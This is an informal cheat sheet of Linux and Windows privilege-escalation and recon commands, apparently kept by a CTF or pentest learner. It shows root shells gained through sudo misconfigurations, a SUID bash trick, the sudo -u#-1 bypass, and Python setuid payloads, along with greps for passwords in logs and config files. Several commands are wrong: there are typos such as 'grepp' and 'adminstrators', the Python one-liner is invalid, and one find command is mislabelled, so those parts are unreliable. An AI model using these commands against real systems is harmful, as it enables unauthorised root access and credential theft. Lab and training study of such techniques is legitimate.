

# Linux Privilege escalation:
- When a .sh file can be ran as root you can do the following to escalate privileges:
```shell
sudo <file> -c "chmod +s  /bin/bash/" 
```

## Check what can be ran as sudo
```shell
find / -perm -6000 2>/dev/null
```

## enum users
```shell
cut -d: -f1 /etc/passwd
```

## (ALL, !root) /bin/bash
If for some reason you see that after `sudo -l`, just run this:
```shell
sudo -u#-1 /bin/bash
```
idek man...


## Python
If you can run Python as sudo, well...
```python
import os os.system('/bin/bash')
```
If you can set the uid...
You can check if that's the case by running:
```shell
getcap /usr/bin/python3.8
```
And then create a python script as follows:
```python
import os

os.setuid(0)
os.system("/bin/bash")
```
And then run it from the python path, for example:
```shell
/usr/bin/python3.8 payload.py
```
And you'll get a root shell.

Useful apps
```
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```

You can go to /var/log and look for passwords with grep
```
grep -r '[username]'
grep -r 'password'
grep -r 'pswd'
```

# Windows Recon

Check installed programs:
```powershell
 Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate

```

Enumerate users:
```powershell
net users
```

Find privileged users:
```powershell
net localgroup adminstrators
```

Look for writable services:
```
sc qc [service name]
```


DLL Hijacking:
```powershell
$env:PATH -split ';'
```

Look for passwords in files:
```powershell
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini
```

List scheduled tasks
```powershell
schtasks /query /fo LIST /v
```


## Network stuff

Try to enumerate which ports are open:
```shell
netstat -antp | grep 127.0.0.1 | grepp -i LISTEN
```




## Good to know
Once we get a shell and when we deal with web apps, make sure to look for databases. For example on this directory ~/www/

Look for conf files since they can contain passwords for databases, for example.